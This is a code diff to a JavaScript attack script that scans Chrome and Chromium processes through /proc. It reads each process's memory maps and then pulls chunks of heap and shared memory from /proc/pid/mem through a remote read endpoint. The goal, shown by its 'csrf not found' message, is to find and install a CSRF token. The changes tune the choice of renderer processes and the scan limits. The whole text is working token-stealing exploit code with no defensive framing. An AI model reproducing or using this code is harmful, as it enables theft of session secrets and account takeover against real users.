@@ -41,41 +41,48 @@ post('stage start');
 let pc=0;
 for(let pid=1;pid<5000;pid++){
  let c=await rt('/proc/'+pid+'/cmdline');
-  if(!/chrome|chromium/i.test(c))continue;
+ if(!/chrome|chromium/i.test(c))continue;
+ if(c.includes('--type=zygote')||c.includes('--type=gpu')||c.includes('--type=utility'))continue;
+ if(!c.includes('--type=renderer')&&pc>0)continue;
  pc++;
- post('pid '+pid);
+ post('pid '+pid+' '+(c.includes('--type=renderer')?'renderer':'browser'));
  let mr=await r('/proc/'+pid+'/maps');
  post('maps '+mr[0]+' '+mr[1].length);
  if(mr[0]!=200||mr[1].length<10)continue;
  let m=mr[1];
  let regs=[];
- for(let line of m.split('\n')){
+ let lines=m.split('\n').filter(line=>line.includes('rw'));
+ post('rwlines '+lines.length);
+ for(let line of lines){
   let q=line.split(/\s+/),x=q[0],perm=q[1]||'',name=q[5]||'';
   if(!x||!perm.includes('r')||!perm.includes('w'))continue;
   let [s,e]=x.split('-').map(v=>parseInt(v,16));
   if(!s||!e||e<=s)continue;
   let sz=e-s;
-  if(sz>0x20000000)continue;
+  if(sz>0x2000000)continue;
   let pri=(name=='[heap]'?0:name.includes('/dev/shm')?1:name?3:2);
+  if(pri==3)continue;
   regs.push({s,e,sz,name,pri});
  }
- regs.sort((a,b)=>a.pri-b.pri||a.sz-b.sz);
+ regs.sort((a,b)=>a.pri-b.pri||b.sz-a.sz);
+ regs=regs.slice(0,35);
  post('regions '+regs.length);
  let scanned=0;
  for(let g of regs){
-  let step=Math.max(0x4000,Math.floor(g.sz/96));
+  let step=Math.max(0x20000,Math.floor(g.sz/24));
   let [st,probe]=await r('/proc/'+pid+'/mem?offset=0x'+g.s.toString(16)+'&limit=64');
   if(st!=200)continue;
   for(let off=g.s;off<g.e;off+=step){
    scanned++;
-   if(scanned%200==0)post('scan '+scanned);
-   if(scanned>1800){post('scan limit');break}
-   let d=await rt('/proc/'+pid+'/mem?offset=0x'+off.toString(16)+'&limit=4000');
+   if(scanned%80==0)post('scan '+scanned);
+   if(scanned>260){post('scan limit');break}
+   let d=await rt('/proc/'+pid+'/mem?offset=0x'+off.toString(16)+'&limit=8000');
    let z=tryChunk(d);
    if(z){install(z);return}
   }
-  if(scanned>1800)break;
+  if(scanned>260)break;
  }
+ if(pc>=3)break;
 }
 post('csrf not found pids '+pc);
 })();
